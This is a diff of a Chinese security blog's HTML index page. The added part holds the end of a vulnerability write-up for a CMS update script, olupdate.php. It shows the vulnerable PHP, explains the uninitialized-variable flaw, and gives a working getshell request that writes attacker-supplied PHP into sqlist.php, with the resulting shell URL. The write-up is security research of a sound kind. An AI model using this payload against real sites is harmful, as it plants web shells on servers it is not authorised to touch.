class="variable">$sqldump</span>) &lt; <span class="variable">$sizelimit</span> * 1000; <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="variable">$sqldump</span> .= sql_dumptable(<span class="variable">$tables</span>[<span class="variable">$i</span>], <span class="variable">$startfrom</span>, strlen(<span class="variable">$sqldump</span>));</span><br><span class="line">        <span class="variable">$startfrom</span> = 0;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$startfrom</span> = <span class="variable">$startrow</span>;</span><br><span class="line">    <span class="variable">$tableid</span> = <span class="variable">$i</span>;</span><br><span class="line">    <span class="keyword">if</span>(trim(<span class="variable">$sqldump</span>))&#123;</span><br><span class="line">        <span class="variable">$sqlfile</span>[]=<span class="variable">$bakfile</span> = <span class="string">"../update/<span class="variable">$addr</span>/&#123;<span class="variable">$con_db_name</span>&#125;_&#123;<span class="variable">$date</span>&#125;_&#123;<span class="variable">$random</span>&#125;_&#123;<span class="variable">$num</span>&#125;.sql"</span>;</span><br><span class="line">        <span class="variable">$version</span>=<span class="string">'version:'</span>.<span class="variable">$metcms_v</span>;</span><br><span class="line">        <span class="variable">$sqldump</span> = <span class="string">"#某CMS .cn Created &#123;<span class="variable">$version</span>&#125; \n#&#123;<span class="variable">$met_weburl</span>&#125;\n#&#123;<span class="variable">$tablepre</span>&#125;\n#&#123;<span class="variable">$met_webkeys</span>&#125;\n# --------------------------------------------------------\n\n\n"</span>.<span class="variable">$sqldump</span>;</span><br><span class="line">        <span class="keyword">if</span>(!file_put_contents(<span class="variable">$bakfile</span>, <span class="variable">$sqldump</span>))&#123;</span><br><span class="line">            dl_error(<span class="variable">$lang_updaterr2</span>.<span class="string">"(&#123;<span class="variable">$adminfile</span>&#125;/update/<span class="variable">$addr</span>/&#123;<span class="variable">$con_db_name</span>&#125;_&#123;<span class="variable">$date</span>&#125;_&#123;<span class="variable">$random</span>&#125;_&#123;<span class="variable">$num</span>&#125;.sql)"</span>,<span class="variable">$type</span>,<span class="variable">$olid</span>,<span class="variable">$ver</span>,<span class="variable">$addr</span>,<span class="variable">$action</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$num</span>++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span>(trim(<span class="variable">$sqldump</span>));</span><br><span class="line"><span class="keyword">if</span>(is_array(<span class="variable">$sqlfile</span>)) <span class="variable">$string</span> = <span class="string">"&lt;?php\n \$sqlfile = "</span>.var_export(<span class="variable">$sqlfile</span>, <span class="literal">true</span>).<span class="string">"; ?&gt;"</span>;</span><br><span class="line">filetest(<span class="string">"../update/<span class="variable">$addr</span>/sqlist.php"</span>);</span><br><span class="line"><span class="keyword">if</span>(!file_put_contents(<span class="string">"../update/<span class="variable">$addr</span>/sqlist.php"</span>,<span class="variable">$string</span>))&#123;</span><br><span class="line">    dl_error(<span class="variable">$lang_updaterr2</span>.<span class="string">"(&#123;<span class="variable">$adminfile</span>&#125;/update/<span class="variable">$addr</span>/sqlist.php)"</span>,<span class="variable">$type</span>,<span class="variable">$olid</span>,<span class="variable">$ver</span>,<span class="variable">$addr</span>,<span class="variable">$action</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>此时由于sqlfile不是数组，即is_array($sqlfile)不成立，导致$string没有初始化，可以任意修改，接着调用file_put_contents将string的值写到/update/$addr/sqlist.php文件。</p>
+<p><em>PS:这里有一个小点,由于输入控制sqlfile不是数组，第345行执行$sqlfile[]=$bakfile = “../update/$addr/{$con_db_name}<em>{$date}</em>{$random}_{$num}.sql”;会导致给字符串赋值报错，导致无法执行到后面的Getshell部分。所以需要构造payload使得trim($sqldump)为空，即$sqldump值为空，从而跳过$sqlfile[]赋值部分，这里构造tableid=1000(其实只要&gt;=44即可)</em></p>
+<p>最后的payload结构如下：<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta-keyword">/admin/</span>system/olupdate.php?action=sql<span class="variable">&amp;sqlfile</span>=<span class="number">1</span><span class="variable">&amp;string</span>=shell内容<span class="variable">&amp;addr</span>=shell的目录<span class="variable">&amp;tableid</span>=<span class="number">1000</span></span><br></pre></td></tr></table></figure></p>
+<h3 id="2-POC-参数addr为生成shell的目录，生成shell的文件名sqlist-php不可控"><a href="#2-POC-参数addr为生成shell的目录，生成shell的文件名sqlist-php不可控" class="headerlink" title="2.POC (参数addr为生成shell的目录，生成shell的文件名sqlist.php不可控)"></a>2.POC (参数addr为生成shell的目录，生成shell的文件名sqlist.php不可控)</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//xxx.com/admin/system/olupdate.php?action=sql&amp;sqlfile=1&amp;string=<span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span>&amp;addr=12313&amp;tableid=1000</span></span><br></pre></td></tr></table></figure>
+<p>执行后的shell地址：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>xxx.com<span class="regexp">/admin/u</span>pdate<span class="regexp">/12313/</span>sqlist.php</span><br></pre></td></tr></table></figure></p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
     <link itemprop="mainEntityOfPage" href="http://blackwolfsec.cc/2018/01/23/Nonecms_ssrf/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -985,144 +1169,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://blackwolfsec.cc/2017/09/13/Openctf-2017/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="BlackWolfsec">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/static/picture/logo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="BlackWolfsec">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2017/09/13/Openctf-2017/" itemprop="url">ISC极客嘉年华OpenCTF-2017Writeup</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-13T00:00:00+08:00">
-                2017-09-13
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF/" itemprop="url" rel="index">
-                    <span itemprop="name">CTF</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <h2 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h2><p>这是一次很简单很简单的CTF,就当练练手吧……<br>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2017/09/13/Openctf-2017/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
@@ -1172,7 +1218,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">41</span>
+                <span class="site-state-item-count">42</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
